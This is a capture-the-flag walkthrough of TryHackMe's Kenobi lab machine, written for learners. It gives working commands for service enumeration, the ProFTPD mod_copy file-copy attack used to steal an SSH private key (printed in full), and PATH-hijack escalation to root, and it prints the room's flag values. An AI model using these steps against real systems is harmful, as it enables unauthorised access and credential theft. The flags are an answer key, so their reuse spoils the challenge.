# TryHackMe's Kenobi Room

## Intro

Kenobi is a beginner-friendly room on TryHackMe that simulates a real-world attack scenario involving common vulnerabilities in NFS, Samba, and ProFTPD services. In this write-up, we'll break down the steps I took to gain user and root access on the Kenobi machine. This room is ideal for beginners exploring privilege escalation and network exploitation. Let's dive in!

## Initial Reconnaissance

Like any penetration test, we started with information gathering to understand the target machine's open ports and services. We kicked things off with a simple Nmap scan to get a clearer picture of what was running on the machine.

```bash
root@ip-10-10-216-44:~# nmap -sV 10.10.253.8

Starting Nmap 7.60 ( https://nmap.org ) at 2024-09-18 12:57 BST
Nmap scan report for ip-10-10-253-8.eu-west-1.compute.internal (10.10.253.8)
Host is up (0.00079s latency).
Not shown: 993 closed ports
PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         ProFTPD 1.3.5
22/tcp   open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http        Apache httpd 2.4.18 ((Ubuntu))
111/tcp  open  rpcbind     2-4 (RPC #100000)
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
2049/tcp open  nfs_acl     2-3 (RPC #100227)
MAC Address: 02:98:F1:F1:CF:23 (Unknown)
Service Info: Host: KENOBI; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 14.23 seconds
```

The scan revealed several interesting services. At this point, we had enough information to begin probing deeper into these services for potential vulnerabilities.

## Enumerating SMB Shares

The next step was to enumerate the Samba service to check for shared directories that could expose sensitive information. Using the **smb-enum-shares** and **smb-enum-users** Nmap scripts, I was able to gather details about accessible shares.

```bash
root@ip-10-10-216-44:~# nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse 10.10.253.8

Starting Nmap 7.60 ( https://nmap.org ) at 2024-09-18 13:03 BST
Nmap scan report for ip-10-10-253-8.eu-west-1.compute.internal (10.10.253.8)
Host is up (0.00043s latency).

PORT    STATE SERVICE
445/tcp open  microsoft-ds
MAC Address: 02:98:F1:F1:CF:23 (Unknown)

Host script results:
| smb-enum-shares:
|   account_used: guest
|   \\10.10.253.8\IPC$:
|     Type: STYPE_IPC_HIDDEN
|     Comment: IPC Service (kenobi server (Samba, Ubuntu))
|     Users: 2
|     Max Users: <unlimited>
|     Path: C:\tmp
|     Anonymous access: READ/WRITE
|     Current user access: READ/WRITE
|   \\10.10.253.8\anonymous:
|     Type: STYPE_DISKTREE
|     Comment:
|     Users: 0
|     Max Users: <unlimited>
|     Path: C:\home\kenobi\share
|     Anonymous access: READ/WRITE
|     Current user access: READ/WRITE
|   \\10.10.253.8\print$:
|     Type: STYPE_DISKTREE
|     Comment: Printer Drivers
|     Users: 0
|     Max Users: <unlimited>
|     Path: C:\var\lib\samba\printers
|     Anonymous access: <none>
|_    Current user access: <none>

Nmap done: 1 IP address (1 host up) scanned in 1.31 seconds
```

The scan showed that the anonymous share had read/write permissions. This hinted at the possibility of exploring the contents of the anonymous share, which might contain useful files.

## Accessing the SMB Share

I connected to the share using **smbclient**, a tool that allows you to interact with SMB/CIFS resources on servers.

```bash
root@ip-10-10-216-44:~# smbclient -U ben //10.10.253.8/anonymous
WARNING: The "syslog" option is deprecated
Enter WORKGROUP\ben's password:
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Wed Sep  4 11:49:09 2019
  ..                                  D        0  Wed Sep  4 11:56:07 2019
  log.txt                             N    12237  Wed Sep  4 11:49:09 2019

		9204224 blocks of size 1024. 6877112 blocks available
```

TIP: You can use any user and leave the password empty.  
Upon accessing the share, I found a log.txt file, which I promptly downloaded using **smbget**.

```bash
root@ip-10-10-216-44:~/workspace# smbget -R smb://10.10.253.8/anonymous
Password for [guest] connecting to //anonymous/10.10.253.8:
Using workgroup WORKGROUP, user guest
smb://10.10.253.8/anonymous/log.txt
Downloaded 11.95kB in 1 seconds
root@ip-10-10-216-44:~/workspace# ls
log.txt
```

The contents of this file didn't contain anything immediately exploitable, but this was the first step toward gaining a foothold. In that file i found information about user kenobi's ssh keys. Here's the relevant extract:

```bash
...
Generating public/private rsa key pair.
Enter file in which to save the key (/home/kenobi/.ssh/id_rsa):
Created directory '/home/kenobi/.ssh'.
Enter passphrase (empty for no passphrase):
Enter same passphrase again:
Your identification has been saved in /home/kenobi/.ssh/id_rsa.
Your public key has been saved in /home/kenobi/.ssh/id_rsa.pub.
...
```

## Exploiting NFS (Network File System)

Next, I used Nmap to probe the **NFS** service, which was another potential entry point.

```bash
root@ip-10-10-216-44:~/workspace# nmap -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount 10.10.253.8

Starting Nmap 7.60 ( https://nmap.org ) at 2024-09-18 13:28 BST
Nmap scan report for ip-10-10-253-8.eu-west-1.compute.internal (10.10.253.8)
Host is up (0.00024s latency).

PORT    STATE SERVICE
111/tcp open  rpcbind
| nfs-ls: Volume /var
|   access: Read Lookup NoModify NoExtend NoDelete NoExecute
| PERMISSION  UID  GID  SIZE  TIME                 FILENAME
| rwxr-xr-x   0    0    4096  2019-09-04T08:53:24  .
| rwxr-xr-x   0    0    4096  2019-09-04T12:27:33  ..
| rwxr-xr-x   0    0    4096  2019-09-04T12:09:49  backups
| rwxr-xr-x   0    0    4096  2019-09-04T10:37:44  cache
| rwxrwxrwt   0    0    4096  2019-09-04T08:43:56  crash
| rwxrwsr-x   0    50   4096  2016-04-12T20:14:23  local
| rwxrwxrwx   0    0    9     2019-09-04T08:41:33  lock
| rwxrwxr-x   0    108  4096  2019-09-04T10:37:44  log
| rwxr-xr-x   0    0    4096  2019-01-29T23:27:41  snap
| rwxr-xr-x   0    0    4096  2019-09-04T08:53:24  www
|_
| nfs-showmount:
|_  /var *
| nfs-statfs:
|   Filesystem  1K-blocks  Used       Available  Use%  Maxfilesize  Maxlink
|_  /var        9204224.0  1836520.0  6877108.0  22%   16.0T        32000
MAC Address: 02:98:F1:F1:CF:23 (Unknown)

Nmap done: 1 IP address (1 host up) scanned in 0.93 seconds
```

This scan revealed that the /var directory was shared over NFS.

## ProFTPD Exploitation

At this point, I turned my attention to **ProFTPD**, an FTP server known for certain vulnerabilities, and using netcat I discovered its version.

```bash
root@ip-10-10-216-44:~/workspace# nc 10.10.253.8 21
220 ProFTPD 1.3.5 Server (ProFTPD Default Installation) [10.10.253.8]
```

A search on **searchsploit** revealed that ProFTPD 1.3.5 is vulnerable to a remote command execution vulnerability via its mod_copy module.

```bash
root@ip-10-10-216-44:~/workspace# searchsploit proftpd 1.3.5
--------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                         |  Path
--------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
ProFTPd 1.3.5 - 'mod_copy' Command Execution (Metasploit)                                                                              | linux/remote/37262.rb
ProFTPd 1.3.5 - 'mod_copy' Remote Command Execution                                                                                    | linux/remote/36803.py
ProFTPd 1.3.5 - 'mod_copy' Remote Command Execution (2)                                                                                | linux/remote/49908.py
ProFTPd 1.3.5 - File Copy                                                                                                              | linux/remote/36742.txt
--------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

Basically the SITE CPFR and SITE CPTO commands can be used to copy files/directories from one place to another on the server.  
Leveraging these commands and the previous information about kenobi's ssh keys I copied the SSH private key from Kenobi's home directory to /var/tmp, where I could access it via the NFS share.

```bash
root@ip-10-10-216-44:~/workspace# nc 10.10.253.8 21
220 ProFTPD 1.3.5 Server (ProFTPD Default Installation) [10.10.253.8]
SITE CPFR /home/kenobi/.ssh/id_rsa
350 File or directory exists, ready for destination name
SITE CPTO /var/tmp/id_rsa
250 Copy successful
```

```bash
root@ip-10-10-216-44:~/workspace# mkdir /mnt/kenobiNFS
root@ip-10-10-216-44:~/workspace# mount 10.10.253.8:/var /mnt/kenobiNFS
root@ip-10-10-216-44:~/workspace# cat /mnt/kenobiNFS/tmp/id_rsa
-----BEGIN RSA PRIVATE KEY-----
MIIEowIBAAKCAQEA4PeD0e0522UEj7xlrLmN68R6iSG3HMK/aTI812CTtzM9gnXs
qpweZL+GJBB59bSG3RTPtirC3M9YNTDsuTvxw9Y/+NuUGJIq5laQZS5e2RaqI1nv
U7fXEQlJrrlWfCy9VDTlgB/KRxKerqc42aU+/BrSyYqImpN6AgoNm/s/753DEPJt
dwsr45KFJOhtaIPA4EoZAq8pKovdSFteeUHikosUQzgqvSCv1RH8ZYBTwslxSorW
y3fXs5GwjitvRnQEVTO/GZomGV8UhjrT3TKbPhiwOy5YA484Lp3ES0uxKJEnKdSt
otHFT4i1hXq6T0CvYoaEpL7zCq7udl7KcZ0zfwIDAQABAoIBAEDl5nc28kviVnCI
ruQnG1P6eEb7HPIFFGbqgTa4u6RL+eCa2E1XgEUcIzxgLG6/R3CbwlgQ+entPssJ
dCDztAkE06uc3JpCAHI2Yq1ttRr3ONm95hbGoBpgDYuEF/j2hx+1qsdNZHMgYfqM
bxAKZaMgsdJGTqYZCUdxUv++eXFMDTTw/h2SCAuPE2Nb1f1537w/UQbB5HwZfVry
tRHknh1hfcjh4ZD5x5Bta/THjjsZo1kb/UuX41TKDFE/6+Eq+G9AvWNC2LJ6My36
YfeRs89A1Pc2XD08LoglPxzR7Hox36VOGD+95STWsBViMlk2lJ5IzU9XVIt3EnCl
bUI7DNECgYEA8ZymxvRV7yvDHHLjw5Vj/puVIQnKtadmE9H9UtfGV8gI/NddE66e
t8uIhiydcxE/u8DZd+mPt1RMU9GeUT5WxZ8MpO0UPVPIRiSBHnyu+0tolZSLqVul
rwT/nMDCJGQNaSOb2kq+Y3DJBHhlOeTsxAi2YEwrK9hPFQ5btlQichMCgYEA7l0c
dd1mwrjZ51lWWXvQzOH0PZH/diqXiTgwD6F1sUYPAc4qZ79blloeIhrVIj+isvtq
mgG2GD0TWueNnddGafwIp3USIxZOcw+e5hHmxy0KHpqstbPZc99IUQ5UBQHZYCvl
SR+ANdNuWpRTD6gWeVqNVni9wXjKhiKM17p3RmUCgYEAp6dwAvZg+wl+5irC6WCs
dmw3WymUQ+DY8D/ybJ3Vv+vKcMhwicvNzvOo1JH433PEqd/0B0VGuIwCOtdl6DI9
u/vVpkvsk3Gjsyh5gFI8iZuWAtWE5Av4OC5bwMXw8ZeLxr0y1JKw8ge9NSDl/Pph
YNY61y+DdXUvywifkzFmhYkCgYB6TeZbh9XBVg3gyhMnaQNzDQFAUlhM7n/Alcb7
TjJQWo06tOlHQIWi+Ox7PV9c6l/2DFDfYr9nYnc67pLYiWwE16AtJEHBJSHtofc7
P7Y1PqPxnhW+SeDqtoepp3tu8kryMLO+OF6Vv73g1jhkUS/u5oqc8ukSi4MHHlU8
H94xjQKBgExhzreYXCjK9FswXhUU9avijJkoAsSbIybRzq1YnX0gSewY/SB2xPjF
S40wzYviRHr/h0TOOzXzX8VMAQx5XnhZ5C/WMhb0cMErK8z+jvDavEpkMUlR+dWf
Py/CLlDCU4e+49XBAPKEmY4DuN+J2Em/tCz7dzfCNS/mpsSEn0jo
-----END RSA PRIVATE KEY-----
```

With the key in hand, I secured it and used it to SSH into the machine.

```bash
root@ip-10-10-216-44:~/workspace# cp /mnt/kenobiNFS/tmp/id_rsa .
root@ip-10-10-216-44:~/workspace# chmod 600 id_rsa
root@ip-10-10-216-44:~/workspace# ssh -i id_rsa kenobi@10.10.253.8
Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.8.0-58-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

103 packages can be updated.
65 updates are security updates.


Last login: Wed Sep  4 07:10:15 2019 from 192.168.1.147
To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.

kenobi@kenobi:~$ cat /home/kenobi/user.txt
d0b0f3f53b6caa532a83915e19224899
```

## Privilege Escalation

With access to the Kenobi user account, it was time to escalate privileges and gain root access. The usual method here is to check for SUID binaries that may allow execution as the root user.

```bash
kenobi@kenobi:~$ find / -perm -u=s -type f 2>/dev/null
/sbin/mount.nfs
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/snapd/snap-confine
/usr/lib/eject/dmcrypt-get-device
/usr/lib/openssh/ssh-keysign
/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
/usr/bin/chfn
/usr/bin/newgidmap
/usr/bin/pkexec
/usr/bin/passwd
/usr/bin/newuidmap
/usr/bin/gpasswd
/usr/bin/menu
/usr/bin/sudo
/usr/bin/chsh
/usr/bin/at
/usr/bin/newgrp
/bin/umount
/bin/fusermount
/bin/mount
/bin/ping
/bin/su
/bin/ping6
```

One of the binaries, /usr/bin/menu, piqued my interest.

```bash
kenobi@kenobi:~$ /usr/bin/menu

***************************************
1. status check
2. kernel version
3. ifconfig
** Enter your choice :1
HTTP/1.1 200 OK
Date: Wed, 18 Sep 2024 13:02:02 GMT
Server: Apache/2.4.18 (Ubuntu)
Last-Modified: Wed, 04 Sep 2019 09:07:20 GMT
ETag: "c8-591b6884b6ed2"
Accept-Ranges: bytes
Content-Length: 200
Vary: Accept-Encoding
Content-Type: text/html
```

After inspecting the binary with **strings**, I noticed it called the curl command without specifying the full path.

```bash
strings /usr/bin/menu
...
** Enter your choice :
curl -I localhost
uname -r
ifconfig
 Invalid choice
...
```

This allowed me to exploit **path hijacking** by replacing the curl binary with a malicious one.  
After running the menu script, I successfully achieved a root shell.

```bash
kenobi@kenobi:/tmp$ echo /bin/bash > curl
kenobi@kenobi:/tmp$ chmod 777 curl
kenobi@kenobi:/tmp$ export PATH=/tmp:$PATH
kenobi@kenobi:/tmp$ /usr/bin/menu

***************************************
1. status check
2. kernel version
3. ifconfig
** Enter your choice :1
To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.

root@kenobi:/tmp# id
uid=0(root) gid=1000(kenobi) groups=1000(kenobi),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),110(lxd),113(lpadmin),114(sambashare)
root@kenobi:/tmp# whoami
root
```

Finally, I read the root.txt flag.

```bash
root@kenobi:/tmp# cat /root/root.txt
177b3cd8562289f37382721c28381f02
```

## Conclusion

In this walkthrough, we exploited multiple services and techniques, including:

- NFS and SMB enumeration
- Exploiting ProFTPD using mod_copy
- SSH key extraction and usage
- Privilege escalation via path hijacking

Each step relied on careful reconnaissance, enumeration, and leveraging common misconfigurations, which underscores the importance of securing network services and limiting file permissions. This room is an excellent exercise in real-world attack vectors and helps reinforce critical concepts in penetration testing.

Stay tuned for more write-ups and walkthroughs from my hacking journey. Until next time, happy hacking!
